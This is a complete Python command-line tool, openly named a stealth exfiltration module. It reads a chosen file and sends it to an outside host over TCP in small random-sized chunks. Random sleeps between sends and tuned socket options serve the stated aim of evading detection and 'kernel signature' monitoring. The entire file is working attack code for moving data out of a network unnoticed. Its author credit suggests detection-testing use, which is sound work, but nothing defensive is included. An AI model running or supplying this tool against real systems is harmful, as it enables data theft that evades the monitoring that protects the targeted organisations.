#!/usr/bin/env python3
"""
Stealth Exfiltration Module
============================
Implements 'Low-and-Slow' exfiltration with:
- Randomized chunk sizes (100-500 bytes)
- Randomized jitter (sleep intervals) between packets
- Manual TCP socket options to interfere with Nagle's algorithm

Author: Senior Detection Engineer
"""

import socket
import sys
import argparse
import time
import random
from pathlib import Path


class StealthExfiltrator:
    """Low-and-slow exfiltration with kernel signature evasion."""
    
    def __init__(self, host: str, port: int, min_chunk: int = 100, max_chunk: int = 500,
                 min_jitter: float = 0.1, max_jitter: float = 2.0):
        """
        Initialize stealth exfiltrator.
        
        Args:
            host: Target hostname or IP
            port: Target port
            min_chunk: Minimum chunk size in bytes
            max_chunk: Maximum chunk size in bytes
            min_jitter: Minimum sleep interval in seconds
            max_jitter: Maximum sleep interval in seconds
        """
        self.host = host
        self.port = port
        self.min_chunk = min_chunk
        self.max_chunk = max_chunk
        self.min_jitter = min_jitter
        self.max_jitter = max_jitter
        self.sock = None
        
    def _configure_socket(self):
        """Configure socket with options to interfere with Nagle's algorithm."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Disable Nagle's algorithm - send immediately without buffering
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Set socket buffer sizes (smaller to force more frequent sends)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        
        # Set TCP keepalive
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        # Additional TCP options for fine-grained control
        # TCP_CORK can be used to batch sends, but we'll toggle it
        try:
            # Some systems may not support TCP_CORK
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_CORK, 0)
        except (AttributeError, OSError):
            pass  # TCP_CORK not available on this system
        
    def _random_chunk_size(self) -> int:
        """Generate random chunk size within configured range."""
        return random.randint(self.min_chunk, self.max_chunk)
    
    def _random_jitter(self) -> float:
        """Generate random sleep interval."""
        return random.uniform(self.min_jitter, self.max_jitter)
    
    def exfiltrate(self, file_path: str, verbose: bool = True):
        """
        Perform low-and-slow exfiltration of file.
        
        Args:
            file_path: Path to file to exfiltrate
            verbose: Enable verbose output
        """
        file_path = Path(file_path)
        if not file_path.exists():
            raise FileNotFoundError(f"File not found: {file_path}")
        
        if verbose:
            print(f"[*] Connecting to {self.host}:{self.port}")
        
        self._configure_socket()
        
        try:
            self.sock.connect((self.host, self.port))
            if verbose:
                print(f"[+] Connected to {self.host}:{self.port}")
            
            with open(file_path, 'rb') as f:
                total_sent = 0
                file_size = file_path.stat().st_size
                packet_count = 0
                start_time = time.time()
                
                if verbose:
                    print(f"[*] Starting low-and-slow exfiltration")
                    print(f"[*] File size: {file_size} bytes")
                    print(f"[*] Chunk range: {self.min_chunk}-{self.max_chunk} bytes")
                    print(f"[*] Jitter range: {self.min_jitter}-{self.max_jitter} seconds")
                    print("-" * 60)
                
                while True:
                    # Random chunk size
                    chunk_size = self._random_chunk_size()
                    chunk = f.read(chunk_size)
                    
                    if not chunk:
                        break
                    
                    # Send chunk
                    sent = self.sock.send(chunk)
                    total_sent += sent
                    packet_count += 1
                    
                    # Random jitter before next send
                    jitter = self._random_jitter()
                    time.sleep(jitter)
                    
                    # Progress indicator (less frequent to avoid detection)
                    if verbose and packet_count % 50 == 0:
                        progress = (total_sent / file_size) * 100
                        elapsed = time.time() - start_time
                        avg_rate = (total_sent / elapsed) / 1024 if elapsed > 0 else 0
                        print(f"[*] Packets: {packet_count} | "
                              f"Progress: {progress:.2f}% | "
                              f"Rate: {avg_rate:.2f} KB/s")
                
                elapsed = time.time() - start_time
                
                if verbose:
                    print("-" * 60)
                    print(f"[+] Exfiltration completed")
                    print(f"[*] Total bytes: {total_sent}")
                    print(f"[*] Total packets: {packet_count}")
                    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
                    print(f"[*] Average throughput: {(total_sent / elapsed) / 1024:.2f} KB/s")
                    print(f"[*] Average packet size: {total_sent / packet_count:.2f} bytes")
                    print(f"[*] Average jitter: {(self.min_jitter + self.max_jitter) / 2:.2f} seconds")
            
        except Exception as e:
            print(f"[-] Error: {e}", file=sys.stderr)
            sys.exit(1)
        finally:
            if self.sock:
                self.sock.close()
                if verbose:
                    print("[*] Connection closed")


def main():
    parser = argparse.ArgumentParser(
        description="Stealth low-and-slow exfiltration with kernel signature evasion"
    )
    parser.add_argument('host', help='Target hostname or IP address')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('file', help='Path to file to exfiltrate')
    parser.add_argument(
        '--min-chunk',
        type=int,
        default=100,
        help='Minimum chunk size in bytes (default: 100)'
    )
    parser.add_argument(
        '--max-chunk',
        type=int,
        default=500,
        help='Maximum chunk size in bytes (default: 500)'
    )
    parser.add_argument(
        '--min-jitter',
        type=float,
        default=0.1,
        help='Minimum sleep interval in seconds (default: 0.1)'
    )
    parser.add_argument(
        '--max-jitter',
        type=float,
        default=2.0,
        help='Maximum sleep interval in seconds (default: 2.0)'
    )
    parser.add_argument(
        '--quiet',
        action='store_true',
        help='Suppress verbose output'
    )
    
    args = parser.parse_args()
    
    if not args.quiet:
        print("=" * 60)
        print("Stealth Exfiltration (Low-and-Slow)")
        print("=" * 60)
        print(f"[*] Target: {args.host}:{args.port}")
        print(f"[*] File: {args.file}")
        print("=" * 60)
    
    exfiltrator = StealthExfiltrator(
        args.host,
        args.port,
        args.min_chunk,
        args.max_chunk,
        args.min_jitter,
        args.max_jitter
    )
    
    exfiltrator.exfiltrate(args.file, verbose=not args.quiet)


if __name__ == '__main__':
    main()
